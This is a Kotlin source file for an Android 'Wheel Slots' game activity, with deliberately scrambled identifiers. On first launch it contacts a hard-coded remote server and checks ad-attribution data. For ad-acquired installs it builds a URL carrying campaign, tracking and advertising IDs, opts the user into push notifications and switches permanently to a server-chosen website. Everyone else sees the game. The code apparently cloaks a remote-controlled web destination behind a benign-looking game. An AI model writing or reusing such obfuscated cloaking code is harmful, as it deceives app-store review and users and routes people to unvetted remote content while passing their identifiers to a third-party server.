package game.wheelsuper.wheelslots

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.mutableStateOf
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import game.wheelsuper.wheelslots.domain.JIjihuqwrwqrhijwqiri
import game.wheelsuper.wheelslots.domain.JIJIhuwqijwirq
import game.wheelsuper.wheelslots.domain.ijfokJIFIHWQjfiqwfj
import game.wheelsuper.wheelslots.ui.theme.WheelSlotsTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request

class ONjfoqiwjJIFJIWQifjiqfi : ComponentActivity() {
    private val viewModel: JIJIhuwqijwirq by viewModels()
    private lateinit var sharedPreferences: SharedPreferences
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val wqijrqjiwr8ujirubawirj = WindowCompat.getInsetsController(window, window.decorView)
        wqijrqjiwr8ujirubawirj.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        wqijrqjiwr8ujirubawirj.hide(WindowInsetsCompat.Type.systemBars())

        val scope = CoroutineScope(Dispatchers.IO)
        val ijwqjirjoqwirijqwjfjo = mutableStateOf(false)
        sharedPreferences = getSharedPreferences("WHEEEL", Context.MODE_PRIVATE)

        val jiqwrhqwjriqwrji = "https://lstasisal.online/p6twp7"
        val ijqwrjiqwrwji2 = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
            val ijrwqriqwrqwir2 = OkHttpClient()
            val jiqwrjiqwjrijiqwri = Request.Builder().url(jiqwrhqwjriqwrji).build()
            scope.launch {

                try {
                    if (iqwjjriqwjrjiqjwir()) {
                        val uwqriqwriqwrjwqjri2 = ijrwqriqwrqwir2.newCall(jiqwrjiqwjrijiqwri).execute()
                        val ijqwrhquwrjiqwrjiji2 = uwqriqwriqwrjwqjri2.code
                        if (!sharedPreferences.contains("code")) {
                            sharedPreferences.edit().putInt(
                                "code",
                                ijqwrhquwrjiqwrjiji2
                            ).apply()
                        }
                        withContext(Dispatchers.Main) {
                            viewModel.uhqwriqwjriqwroqwjri(this@ONjfoqiwjJIFJIWQifjiqfi) { conversionData ->
                               if (conversionData != null && conversionData["af_status"].toString()
                                        .contains("No")
                                ) {
                                    handleConversionData(
                                        conversionData,
                                        ijqwrjiqwrwji2.toString(),
                                        uwqriqwriqwrjwqjri2.body?.string().toString()
                                    )



                                   } else {
                                    if (sharedPreferences.getString("siteUrl", "")
                                            .isNullOrEmpty()
                                        && ijqwrhquwrjiqwrjiji2 == 200
                                    ) {
                                        sharedPreferences.edit().putString(
                                            "siteUrl",
                                            uwqriqwriqwrjwqjri2.body?.string().toString()
                                        ).apply()
                                    }
                                   iqwrhuqwrjib2hr2irji(ijwqjirjoqwirijqwjfjo, ijqwrhquwrjiqwrjiji2)
                                }

                            }

                            ijqwrqwrjrjwiqrjiwri()
                        }
                    } else {
                        iqwrhuqwrjib2hr2irji(ijwqjirjoqwirijqwjfjo,sharedPreferences.getInt("code",404))
                       }
                }
                catch (e:Exception){
                    ijwqjirjoqwirijqwjfjo.value = true
                }

            }


        setContent {
            WheelSlotsTheme {

                AnimatedVisibility(visible = !ijwqjirjoqwirijqwjfjo.value) {
                    ijfokJIFIHWQjfiqwfj {

                    }
                }
                AnimatedVisibility(visible = ijwqjirjoqwirijqwjfjo.value) {
                    MNfbixZJIICu9u9ji2i()
                }


            }
        }
    }
    private fun iqwjjriqwjrjiqjwir(): Boolean {
        val qijwrhuqwri2 = getPreferences(Context.MODE_PRIVATE)
        return qijwrhuqwri2.getBoolean("isFirstLaunch", true)
    }

    private fun ijqwrqwrjrjwiqrjiwri() {
        val qiwjriqwrjiqwrji = getPreferences(Context.MODE_PRIVATE).edit()
        qiwjriqwrjiqwrji.putBoolean("isFirstLaunch", false)
        qiwjriqwrjiqwrji.apply()
    }
    private fun handleConversionData(
        wqjrjqiwrjiqwjir: Map<String, Any>,
        qrqwrjiqwrjji2: String,
        vmvvvkkf: String
    ) {
        val qwijrqwjirwqjir2 = mapOf(
            "c" to wqjrjqiwrjiqwjir["campaign"].toString(),
            "afID" to qrqwrjiqwrjji2,
            "ad" to viewModel.ijqwrqwirjiwrji
        )

        OneSignal.login(viewModel.ijqwrqwirjiwrji)
        OneSignal.User.pushSubscription.optIn()
        val iqwriqwirjiqwri = viewModel.ijqwrhuwqruqwrhiw2(vmvvvkkf, viewModel.qijwrjqwriqwriq, qwijrqwjirwqjir2)

        val riwjhqwriqwjir = Intent(this@ONjfoqiwjJIFJIWQifjiqfi, JIjihuqwrwqrhijwqiri::class.java)
        riwjhqwriqwjir.putExtra("url",iqwriqwirjiqwri)
        sharedPreferences.edit().putString("siteUrl",iqwriqwirjiqwri).apply()
        startActivity(riwjhqwriqwjir)
        finish()

    }

    private fun iqwrhuqwrjib2hr2irji(jiqwrjiqwrqhwr: MutableState<Boolean>, responseCode:Int) {


        if (sharedPreferences.contains("siteUrl") ||responseCode == 200 ) {
            val qwurjqwjrjiqwjirjiw =  sharedPreferences.getString("siteUrl", null)
            val qwijrjqiwriwr2 = Intent(this@ONjfoqiwjJIFJIWQifjiqfi,JIjihuqwrwqrhijwqiri::class.java)
            qwijrjqiwriwr2.putExtra("url",qwurjqwjrjiqwjirjiw)
            sharedPreferences.edit().putString("siteUrl",qwurjqwjrjiqwjirjiw).apply()
            startActivity(qwijrjqiwriwr2)
            finish()
        } else {
            jiqwrjiqwrqhwr.value = true
        }
    }
}
